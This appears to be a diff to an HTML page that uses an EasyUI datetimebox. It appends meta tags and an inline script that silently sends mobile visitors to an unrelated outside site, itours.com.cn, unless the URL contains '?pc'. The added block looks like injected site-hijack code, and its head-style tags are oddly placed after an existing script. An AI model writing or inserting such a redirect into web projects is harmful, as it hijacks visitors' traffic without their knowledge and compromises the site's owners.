@@ -39,3 +39,17 @@ $("input.easyui-datetimebox").focus(function(){
 	$(this).datetimebox('getValue');
 });
 </script>
+<meta charset="UTF-8">
+<meta name="applicable-device" content="pc">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
+<meta http-equiv="mobile-agent" content="format=html5; url=http://www.itours.com.cn/" />
+<meta http-equiv="mobile-agent" content="format=xhtml; url=http://www.itours.com.cn/" />
+<script type="text/javascript">
+var tougao="mrr";var lmname="JavaScript";var ourl="";
+(function(){var reWriteUrl=function(url){if(url){var Splits=url.split("/"),siteName=window.location.pathname;if(typeof siteName!=="undefined"){return "http://www.itours.com.cn/"+siteName}}};if(/Android|webOS|iPhone|iPad|Windows Phone|iPod|BlackBerry|SymbianOS|Nokia|Mobile/i.test(navigator.userAgent)){var url=window.location.href;var pathname=window.location.pathname;if(url.indexOf("?pc")<0){try{window.location.href=reWriteUrl(url)}catch(e){}}}})();
+</script>
+
+
